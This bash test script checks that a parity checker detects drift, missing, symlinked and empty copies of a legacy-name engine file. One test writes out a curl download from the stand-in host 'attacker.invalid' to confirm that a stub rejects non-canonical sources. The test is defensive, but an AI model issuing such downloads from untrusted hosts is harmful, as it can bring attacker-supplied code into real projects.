#!/usr/bin/env bash
# Behaviour tests for the canonical legacy-name engine parity check.
set -euo pipefail

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
CHECKER="$ROOT/scripts/check-legacy-name-engine-parity.sh"
STUBS="$ROOT/scripts/tests/stubs"
SCRATCH=$(mktemp -d)
trap 'rm -rf -- "$SCRATCH"' EXIT

fail() {
  echo "FAIL: $*" >&2
  exit 1
}

assert_contains() {
  case "$OUTPUT" in
    *"$1"*) ;;
    *) fail "$2 (missing: $1)" ;;
  esac
}

run_check() {
  local local_copy=$1
  set +e
  OUTPUT=$(env \
    PATH="$STUBS:$PATH" \
    RATCHET_PARITY_FIXTURE="$SCRATCH/canonical" \
    "$CHECKER" "$local_copy" 2>&1)
  STATUS=$?
  set -e
}

[ -x "$CHECKER" ] || fail "checker is missing or not executable: $CHECKER"
mkdir -p "$SCRATCH/canonical"
printf '%s\n' 'canonical engine bytes' > "$SCRATCH/canonical/legacy_name_ratchet.py"

set +e
OUTPUT=$(RATCHET_PARITY_FIXTURE="$SCRATCH/canonical" "$STUBS/curl" \
  --fail --silent --show-error --location --retry 3 --proto '=https' --tlsv1.2 \
  -o "$SCRATCH/rejected.py" https://attacker.invalid/legacy_name_ratchet.py 2>&1)
STATUS=$?
set -e
[ "$STATUS" -eq 64 ] || fail "the curl stub accepted a non-canonical URL: $OUTPUT"
assert_contains "unexpected URL" "the curl stub did not explain its source rejection"

cp "$SCRATCH/canonical/legacy_name_ratchet.py" "$SCRATCH/local.py"
run_check "$SCRATCH/local.py"
[ "$STATUS" -eq 0 ] || fail "an identical copy failed: $OUTPUT"
assert_contains "matches canonical" "success did not identify parity"

printf '%s\n' 'Canonical engine bytes' > "$SCRATCH/local.py"
[ "$(wc -c < "$SCRATCH/local.py")" -eq "$(wc -c < "$SCRATCH/canonical/legacy_name_ratchet.py")" ] \
  || fail "the deliberate drift changed file length"
run_check "$SCRATCH/local.py"
[ "$STATUS" -eq 1 ] || fail "an altered copy returned $STATUS instead of 1: $OUTPUT"
assert_contains "::error file=$SCRATCH/local.py::" "drift did not emit a GitHub error annotation"
assert_contains "caura/blob/main/scripts/legacy_name_ratchet.py" "drift did not name the canonical source"
assert_contains "Re-port procedure" "drift did not explain the recovery procedure"
echo "same-length altered-copy proof: exit $STATUS with an actionable drift annotation"

run_check "$SCRATCH/missing.py"
[ "$STATUS" -eq 1 ] || fail "a missing local copy returned $STATUS instead of 1: $OUTPUT"
assert_contains "is missing" "missing-copy failure was not actionable"

ln -s "$SCRATCH/canonical/legacy_name_ratchet.py" "$SCRATCH/link.py"
run_check "$SCRATCH/link.py"
[ "$STATUS" -eq 1 ] || fail "a symlinked local copy returned $STATUS instead of 1: $OUTPUT"
assert_contains "not a regular file" "symlink failure was not actionable"

cp "$SCRATCH/canonical/legacy_name_ratchet.py" "$SCRATCH/local.py"
mv "$SCRATCH/canonical/legacy_name_ratchet.py" "$SCRATCH/canonical/unavailable.py"
run_check "$SCRATCH/local.py"
[ "$STATUS" -ne 0 ] || fail "a failed canonical fetch passed"
assert_contains "could not fetch canonical engine" "fetch failure hid its cause"

: > "$SCRATCH/canonical/legacy_name_ratchet.py"
run_check "$SCRATCH/local.py"
[ "$STATUS" -eq 1 ] || fail "an empty canonical copy returned $STATUS instead of 1: $OUTPUT"
assert_contains "was empty" "empty canonical failure hid its cause"

echo "ratchet parity tests: PASS"
